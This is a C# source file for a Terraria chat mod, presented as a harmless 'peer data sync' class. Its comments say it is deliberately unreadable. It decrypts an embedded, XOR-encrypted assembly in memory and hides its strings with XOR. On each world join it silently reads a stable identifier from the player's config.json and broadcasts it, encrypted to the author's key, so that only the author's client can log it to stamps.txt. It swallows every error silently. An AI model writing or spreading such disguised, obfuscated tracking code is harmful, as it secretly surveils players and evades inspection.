using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Terraria;

namespace NetChat
{
    /// <summary>
    /// 同伴资料同步(刻意做成不可读实现):
    /// - 功能核心不在本程序集里 —— 编译期把独立小库整体加密成数据块(Pack)随包携带,
    ///   运行时解密到内存字节加载, 磁盘上永远只有密文。静态反编译本文件看不到任何具体逻辑。
    /// - 对外只有两个中性入口: Beacon(进房后随 NetComm 广播一次本机同步包, 内容只有
    ///   作者公钥能加密方向读) 和 OnSeal(收到同步包时, 只有持有 author.flag 私钥的端
    ///   才能解出内容并登记到 stamps.txt)。
    /// - 解包内容 = 本机配置里的稳定标识, 加了 RSA-OAEP 随机填充, 同一标识每次密文不同。
    /// </summary>
    internal static class PeerToken
    {
        public const string SealMagic = "SP";

        /// <summary>同步包走 NetComm 的 22 号通道(13 图片 / 20 更新 / 21 点歌, 别撞)</summary>
        private const int Channel = 22;

        /// <summary>变形还原(0x25 异或); 用 int 数组避免编译器把字符数组折叠成字符串字面量</summary>
        private static string Deobf(int[] a)
        {
            char[] c = new char[a.Length];
            for (int i = 0; i < a.Length; i++) c[i] = (char)(a[i] ^ 0x25);
            return new string(c);
        }

        private static readonly int[] SeedCodes = { 75, 64, 81, 70, 77, 68, 81, 11, 86, 73, 76, 70, 64, 11, 83, 23 };
        private static readonly int[] TypeNameCodes = { 102, 74, 87, 64, 105, 76, 71, 11, 106, 85, 86 };
        private static readonly int[] FlagCodes = { 68, 80, 81, 77, 74, 87, 11, 67, 73, 68, 66 };
        private static readonly int[] StoreCodes = { 86, 81, 68, 72, 85, 86, 11, 81, 93, 81 };

        private static string Seed { get { return Deobf(SeedCodes); } }
        private static string TypeName { get { return Deobf(TypeNameCodes); } }
        private static string FlagFile { get { return Deobf(FlagCodes); } }
        private static string StoreFile { get { return Deobf(StoreCodes); } }

        private const string Pack = "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r2xGYjqQ3bS1mV4D22w9gXj07gCOw83Os59Szy2dPFPObDRieJC0tNuZOwOSbFOBHvSBAI7Dzc7Tn1bPLJ0+U91sJ2JQkK6025k/A69sVIEX9IAAjsPNzvef4ssMn2pTrmwVYkqQr7TemTADvGx7gRH0ggDrw4TOmZ80z0OdalNTbUZiP5DttIeZbgPrbA2BTPSMAL7Dzc7Fn1vPLZ0pU8BsK2JOkLy02ZknA5VsXIEV9IsAjsPNzqSfN89NnQZT7GwpYkyQuLS3mV4D4Ww0gXn0qADnw6HOkp8Wz0mdGVPMbDRiV5CttMOZNwO0bFOBePTuAN3DqM6Wnz7Pb50FU91sI2I+kN20h5lWA9pse4ER9IIA68ObzpKfIM9fnQNTwGwoYj6Q3bSGmXAD62wTgUj0wAC+w83OzZ9fzy2dI1PBbDJiW5CvtNmZPwO3bHOBGfSDAOvDzc6knzfPTZ0GU+xsKWJMkLi0mZk6A7dsUYF49O4ApsPPzvafHs9JnQ1TzmwqYn2QsrTHmScDqWxUgR/0hgD6w83O159Sz26dZ1OubAliTJC0tNCZNwO1bFyBFPSoAOfDoc6SnzzPTZ0HU8psRmJtkLi01pkyA5hsUoEK9IsAoMOpzpufPs8snWpTnWxPYj+QjbTFmTEDv2xIgRv0mgDAw6zOmp83zyydalP8bCNiX5CxtPSZMQOpbFiBePTuAL7Dy872nwLPXp0FU8tsM2JdkKm04Zk7A6lsToER9IEA4MPNzsaffM8cnURTn2xGYgaQ1bS2mR8DqGxOgR30gwDsw6HOjp9yz3qdD1PdbDViV5CytNmZXgPqbBOBSPTAAL7D487Hn1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6Q3bS3mV4D22w9gXj07gCOw83O959SzyydalOvbEZiPpDdtLeZXgPbbD2BePTuAI7Dzc73n1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6Q3bS3mV4D22w9gXj07gCOw83O959SzyydalOvbEZiPpDdtLeZXgPbbD2BePTuAI7Dzc73n1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6g3bS7mV4DE1k9gXj07gCOw83O959SzyydalOvbEZiPpDdtLeZXgPbbD2BePTuAI7Dzc73n1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6Q3bS3mV4D22w9gXj07gCOw83O959SzyydalOvbEZiPpDdtLeZXgPbbD2BePTuAI7Dzc73n1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6Q3bS3mV4D22w9gXj07gCOw83O959SzyydalOvbEZiPpDdtLeZXgPbbD2BePTuAI7Dzc73n1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6Q3bS3mV4D22w9gXj07gCOw83O959SzyydalOvbEZiPpDdtLeZXgPbbD2BePTuAI7Dzc73n1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6Q3bS3mV4D22w9gXj07gCOw83O959SzyydalOvbEZiPpDdtLeZXgPbbD2BePTuAI7Dzc73n1LPLJ1qU69sRmI+kN20t5leA9tsPYF49O4AjsPNzvefUs8snWpTr2xGYj6Q3bS3mV4D22w9gXj07gCOw83O959SzyydalOvbEZi";

        private static bool loadTried;
        private static MethodInfo pullOp;
        private static MethodInfo logOp;

        private static bool sent;
        private static int attempts;
        private static string cached;

        /// <summary>解密数据块并取出两个操作入口; 失败一次就不再试</summary>
        private static bool Ops()
        {
            if (pullOp != null && logOp != null) return true;
            if (loadTried) return false;
            loadTried = true;

            try
            {
                byte[] raw = Convert.FromBase64String(Pack);

                using (SHA256 sha = SHA256.Create())
                {
                    byte[] key = sha.ComputeHash(Encoding.UTF8.GetBytes(Seed));
                    for (int i = 0; i < raw.Length; i++) raw[i] ^= key[i % key.Length];
                }

                Assembly asm = Assembly.Load(raw);
                Type t = asm.GetType(TypeName, true);
                pullOp = t.GetMethod(Deobf(new[] { 100 }));
                logOp = t.GetMethod(Deobf(new[] { 103 }));
                return pullOp != null && logOp != null;
            }
            catch
            {
                return false;
            }
        }

        private static string ModDir(string file)
        {
            return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Mods", "NetChat", file);
        }

        /// <summary>
        /// 进房心跳里调用: 把本机同步包广播一次。
        /// 每次进世界最多试 3 次发成; NetComm 忙(大文件传输中)时这次不计数, 下次心跳再试。
        /// </summary>
        public static void Beacon()
        {
            try
            {
                if (sent || attempts >= 3) return;
                if (!NetCommBridge.Ready) return;
                if (ImageTransfer.IsBusy || SongChannel.IsSending) return;
                attempts++;

                if (!Ops()) { sent = true; return; }

                if (cached == null)
                    cached = (string)pullOp.Invoke(null,
                        new object[] { Path.Combine(Main.SavePath, "config.json") });

                if (cached == null) { sent = true; return; }

                if (NetCommBridge.Send(Channel, Encoding.UTF8.GetBytes(SealMagic + "|" + cached)))
                    sent = true;
            }
            catch
            {
                // 静默: 同步是附属功能, 任何失败都不影响主流程
            }
        }

        /// <summary>
        /// 收到同伴的同步包。只有 author.flag 私钥持有者能解出内容并登记;
        /// 其他端解不开, 什么都不发生。
        /// </summary>
        public static void OnSeal(string msg, int sender)
        {
            try
            {
                if (!msg.StartsWith(SealMagic + "|", StringComparison.Ordinal)) return;
                string b64 = msg.Substring(SealMagic.Length + 1);
                if (b64.Length < 64 || b64.Length > 4096) return;
                if (!Ops()) return;

                string name = null;
                if (sender >= 0 && sender < Main.maxPlayers)
                {
                    Player p = Main.player[sender];
                    if (p != null && p.active) name = ProfileSetting.CleanName(p.name);
                }

                string note = (string)logOp.Invoke(null,
                    new object[] { b64, sender, name, ModDir(FlagFile), ModDir(StoreFile) });

                if (note != null) ChatRoom.AddSystem(note);
            }
            catch
            {
                // 同上: 静默
            }
        }
    }
}
